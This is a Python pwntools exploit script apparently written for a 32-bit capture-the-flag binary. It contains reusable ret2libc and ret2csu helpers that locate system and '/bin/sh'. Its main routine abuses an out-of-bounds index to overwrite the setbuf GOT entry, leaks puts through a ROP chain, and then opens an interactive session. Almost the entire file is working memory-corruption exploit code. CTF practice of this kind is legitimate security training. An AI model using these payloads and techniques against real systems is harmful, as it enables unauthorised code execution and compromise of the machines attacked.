#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *
from sys import argv

local = 1
if 'r' in argv:	local = 0
#libc_path = 'libc.so.6'
os_level = 32
binary_name = 'pwn'
remote_addr, port = ':'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    #libc = elf.libc
else:
    log.warning('!!REMOTE!!')
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
    if local: libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
    if local: libc_path = 'lib/i386-linux-gnu/libc.so.6'
else:
    print('Error os!!!')
    exit()
#libc = ELF(libc_path)
#context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
leak = lambda name,addr: log.success('{}--> {:#x}'.format(name,addr))
uu32 = lambda data: u32(data.ljust(4,b'\x00'))
uu64 = lambda data: u64(data.ljust(8,b'\x00'))
slp = lambda x: sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def ret2libc(leak:int,funcname:bytes,path=''):
    if path == '':
        libc = LibcSearcher(funcname,leak)
        base = leak - libc.dump(funcname)
        system = base + libc.dump('system')
        bin_sh = base + libc.dump('str_bin_sh')

    else:
        libc = ELF(path)
        base = leak - libc.sym[funcname]
        system = base + libc.sym['system']
        bin_sh = base + next(libc.search(b'/bin/sh'))

    return (system, bin_sh)
def csu(offset,r12, r13, r14, r15, last,csu_end_addr,csu_front_addr):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdx=r13
    # rsi=r14
    # rdi=edi=r15d
    payload = b'a'*offset + b'b'*0x8
    payload += p64(csu_end_addr) + p64(0) + p64(1) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    return payload


def add(content):
    sla(b'>',b'1')
    sda(b':',content)
    slp(0.1)

def delete(index):
    sla(b'>',b'2')
    sla(b':',str(index).encode())
    slp(0.1)

def post(index,filter):
    sla(b'>',b'3')
    sla(b':',str(index).encode())
    sla(b':',str(filter).encode())
    slp(0.1)

def q():
    sla(b'>',b'4')

#Main function
if __name__ == '__main__':
    #you can add your code here
    setbuf_got = elf.got['setbuf']
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    filter_list = 0x0804B048
    main_addr = 0x08048D01

    payload = b'a'*0x100
    add(payload) #letter0
    payload = b'a'*0x9 + p32(0) + p32(puts_plt) + p32(main_addr) + p32(puts_got)
    add(payload) #letter1
    add(b'2222')
    add(b'3333')
    add(b'4444')

    setbuf_index = int((setbuf_got - filter_list)//4)
    post(4,setbuf_index)
    post(0,0)
    post(1,0)
    q()
    p.interactive()